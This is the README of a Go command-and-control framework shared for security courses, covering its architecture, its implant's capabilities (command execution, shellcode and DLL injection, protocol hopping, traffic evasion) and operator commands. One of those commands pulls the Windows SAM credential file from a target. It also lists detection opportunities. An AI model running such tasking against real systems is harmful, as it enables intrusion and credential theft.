# Numinon - Advanced Network Threat Emulation Framework

## NOTE
This project is still in development mode, sharing here for students of my courses + workshops to have access to current codebase.

## 📋 Table of Contents
- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
- [Components](#components)
- [Installation](#installation)
- [Usage](#usage)
- [Security Considerations](#security-considerations)
- [Educational Purpose](#educational-purpose)

## 🎯 Overview

Numinon is a modular C2 framework written in Go that demonstrates modern adversarial techniques while maintaining operational security (OPSEC) considerations. The framework supports multiple communication protocols, dynamic agent reconfiguration, and comprehensive task management through a clean architectural design.

### Key Capabilities
- **Multi-Protocol Support**: HTTP/1.1, HTTP/2, HTTP/3 (QUIC), WebSocket (Clear/TLS)
- **Dynamic Agent Management**: Runtime protocol switching, configuration morphing
- **Comprehensive Tasking**: File operations, command execution, process enumeration, shellcode injection
- **Operator Interface**: WebSocket-based operator API with real-time task management
- **OPSEC Features**: Traffic padding, jitter, beacon modes

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     Operator Layer                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │
│  │  Client CLI  │  │  WebSocket   │  │   Task       │       │
│  │  (cmd/cli)   │  │   Client     │  │   Broker     │       │
│  └──────────────┘  └──────────────┘  └──────────────┘       │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                      Server Core                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │
│  │   Listener   │  │     Task     │  │   Agent      │       │
│  │   Manager    │  │   Manager    │  │   Tracker    │       │
│  └──────────────┘  └──────────────┘  └──────────────┘       │
│                                                             │
│  ┌──────────────────────────────────────────────────┐       │
│  │           Command Orchestrators                  │       │
│  │  (Upload, Download, RunCmd, Shellcode, etc.)     │       │
│  └──────────────────────────────────────────────────┘       │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                      Agent Layer                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │
│  │ Communicator │  │   Command    │  │   Agent      │       │
│  │   Modules    │  │   Executors  │  │   Core       │       │
│  └──────────────┘  └──────────────┘  └──────────────┘       │
└─────────────────────────────────────────────────────────────┘
```

## 🚀 Features

### Communication Protocols

#### HTTP-Based Protocols
- **HTTP/1.1 Clear (H1C)**: Unencrypted HTTP communication
- **HTTP/1.1 TLS (H1TLS)**: TLS-encrypted HTTP/1.1
- **HTTP/2 TLS (H2TLS)**: Modern HTTP/2 with multiplexing
- **HTTP/3 (H3)**: QUIC-based protocol for improved performance

#### WebSocket Protocols
- **WebSocket Clear (WS)**: Persistent bidirectional communication
- **WebSocket Secure (WSS)**: TLS-encrypted WebSocket connections

### Agent Capabilities

#### 1. **File Operations**
- **Upload**: Transfer files from server to agent with SHA256 verification
    - Base64 encoded transfer
    - Configurable overwrite behavior
    - Hash integrity verification

- **Download**: Retrieve files from agent to server
    - Automatic server-side storage organization
    - SHA256 hash calculation
    - Structured storage by agent ID and timestamp

#### 2. **Command Execution (run_cmd)**
- Cross-platform shell command execution
- Windows support for PowerShell and CMD
- Configurable execution timeouts
- Combined stdout/stderr capture
- Exit code reporting

#### 3. **Process Enumeration**
- List all running processes
- Filter by process name
- Windows-specific implementation using Windows API
- Returns PID and process name (extensible for additional metadata)

#### 4. **Shellcode Execution**
- Reflective DLL injection support
- Self-injection capability (PID 0)
- Export function calling
- PE file parsing and loading
- Import Address Table (IAT) resolution
- Base relocation processing

#### 5. **Dynamic Configuration (Morph)**
- Runtime modification of agent parameters:
    - Beacon delay adjustment
    - Jitter percentage modification
    - Real-time behavior adaptation without reconnection

#### 6. **Protocol Hopping (Hop)**
- Seamless protocol switching
- Automatic listener creation for new protocol
- Connection state management
- Graceful transition with fallback
- Old listener cleanup after successful hop

### Operational Security (OPSEC) Features

#### Traffic Obfuscation
- **Padding Support**: Random payload padding for traffic normalization
    - Configurable min/max padding bytes
    - Base64 encoded random data
    - POST request support for padded check-ins

#### Timing Evasion
- **Jitter Implementation**: Randomized communication intervals
    - Percentage-based variation (0-100%)
    - Prevents predictable traffic patterns

#### Connection Modes
- **Beacon Mode**: Periodic check-ins with disconnect between communications
- **Persistent Mode**: Periodic check-ins with no disconnect between communications

### Server Features

#### Listener Management
- Dynamic listener creation/destruction
- Multi-protocol support per listener
- Agent connection tracking
- Safe shutdown with agent migration checks

#### Task Management
- Asynchronous task queuing
- Task state tracking (pending, dispatched, completed, failed)
- Command-specific orchestrators
- Result processing and validation
- WebSocket push for immediate task delivery

#### Agent Tracking
- Real-time connection monitoring
- Protocol-aware state management
- Hop transition tracking
- Connection timeout detection
- Listener-to-agent mapping

### Operator Interface

#### Client API (WebSocket)
- Real-time bidirectional communication
- Session management
- Task result streaming
- Event notifications

#### Supported Operations
- Listener management (create, list, stop)
- Agent listing and details
- Task creation and monitoring
- Real-time result retrieval

## 📦 Components

### Server (`cmd/server/`)
The core C2 server managing all listeners, agents, and operator connections.

### Agent (`cmd/agent/`)
The implant deployed on target systems, featuring:
- Embedded configuration
- Multi-protocol communication
- Command execution framework
- OS-specific implementations

### Builder (`cmd/builder/`)
Agent compilation system that:
- Embeds configurations at build time
- Generates unique agent UUIDs
- Cross-compilation support (Windows, Linux, macOS)
- Architecture targeting (amd64, arm64)

### Client CLI (`cmd/client_cli/`)
Command-line interface for operators:
- WebSocket connection to server
- Task submission
- Real-time result display
- Listener management

## 🔧 Installation

### Prerequisites
- Go 1.19 or later
- Git
- OpenSSL (for certificate generation)

### Building from Source

1. **Clone the repository**
```bash
git clone https://github.com/faanross/numinon.git
cd numinon
```

2. **Install dependencies**
```bash
go mod download
```

3. **Generate TLS certificates** (for TLS-enabled protocols)
```bash
mkdir certs
openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem -days 365 -nodes
```

4. **Build the server**
```bash
go build -o bin/numinon-server ./cmd/server
```

5. **Build the agent builder**
```bash
go build -o bin/numinon-builder ./cmd/builder
```

6. **Build the client CLI**
```bash
go build -o bin/numinon-client ./cmd/client_cli
```

## 📖 Usage

### Starting the Server
```bash
./bin/numinon-server
```
The server will start with the client API on port 8080 (WebSocket).

### Building Agents

1. **Configure agent settings** in `cmd/builder/agent_config.yaml`:
```yaml
protocol: "H2TLS"
server_ip: "192.168.1.100"
server_port: "443"
check_in_endpoint: "/"
results_endpoint: "/results"
websocket_endpoint: "/ws"
delay: "30s"
jitter: 0.20
beacon_mode: true
skip_verify_tls: true
```

2. **Build agent binary**
```bash
# For current OS/architecture
./bin/numinon-builder -target current

# For specific targets
./bin/numinon-builder -target windows-amd64
./bin/numinon-builder -target linux-amd64
./bin/numinon-builder -target darwin-arm64

# For all supported platforms
./bin/numinon-builder -target all
```

Compiled agents will be in `./bin/` directory.

### Operating the Framework

#### Creating Listeners
```bash
./bin/numinon-client -server ws://localhost:8080/client \
  -action create-listener \
  -proto H2TLS \
  -addr 0.0.0.0:443
```

#### Tasking Agents

**Execute Command:**
```bash
./bin/numinon-client -action task-runcmd \
  -agent <AGENT_ID> \
  -cmd "whoami"
```

**Upload File:**
```bash
./bin/numinon-client -action task-upload \
  -agent <AGENT_ID> \
  -file /path/to/local/file \
  -save C:\\Temp\\uploaded.exe
```

**Download File:**
```bash
./bin/numinon-client -action task-download \
  -agent <AGENT_ID> \
  -file C:\\Windows\\System32\\config\\SAM
```

**Enumerate Processes:**
```bash
./bin/numinon-client -action task-enumerate \
  -agent <AGENT_ID> \
  -process explorer.exe  # Optional filter
```

**Execute Shellcode:**
```bash
./bin/numinon-client -action task-shellcode \
  -agent <AGENT_ID> \
  -shellcode /path/to/shellcode.bin \
  -export LaunchCalc
```

**Morph Configuration:**
```bash
./bin/numinon-client -action task-morph \
  -agent <AGENT_ID> \
  -delay 60s \
  -jitter 0.5
```

**Protocol Hop:**
```bash
./bin/numinon-client -action task-hop \
  -agent <AGENT_ID> \
  -hop-proto WSS \
  -hop-ip 192.168.1.200 \
  -hop-port 8443
```

### Monitoring Operations

**List Agents:**
```bash
./bin/numinon-client -action list-agents
```

**Get Agent Details:**
```bash
./bin/numinon-client -action agent-details -agent <AGENT_ID>
```

**List Listeners:**
```bash
./bin/numinon-client -action list-listeners
```

## 🔒 Security Considerations

### ⚠️ **IMPORTANT DISCLAIMER**
This framework is designed for **authorized security testing and educational purposes only**.

**DO NOT USE** this tool:
- On systems you do not own or have explicit permission to test
- For any illegal activities
- In production environments without proper authorization
- To harm or compromise systems

### Defensive Recommendations
When using Numinon for defensive training:
1. Deploy in isolated lab environments
2. Monitor network traffic for C2 patterns
3. Implement proper network segmentation
4. Use the framework to test detection capabilities
5. Document all testing activities

### Detection Opportunities
- Unusual process creation patterns
- Suspicious network connections
- Uncommon port usage
- TLS certificate anomalies
- Beacon timing patterns
- Process injection indicators

## 📚 Educational Purpose

Numinon serves as an educational tool for:

### Security Professionals
- Understanding modern C2 techniques
- Testing detection and response capabilities
- Developing defensive strategies
- Training SOC analysts

### Researchers
- Studying adversarial behaviors
- Developing new detection methods
- Analyzing C2 communication patterns
- Threat emulation exercises

### Students
- Learning about network protocols
- Understanding system programming
- Studying cybersecurity concepts
- Hands-on security training

## 🤝 Contributing

This is an educational project. Contributions that enhance its educational value while maintaining ethical use are welcome. Please ensure any contributions:
- Include proper documentation
- Follow existing code patterns
- Include appropriate warnings
- Support educational objectives

## 📜 License

This project is for educational purposes. Users are responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction.

## ⚖️ Legal Notice

The developers of Numinon assume no liability for misuse of this software. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

---
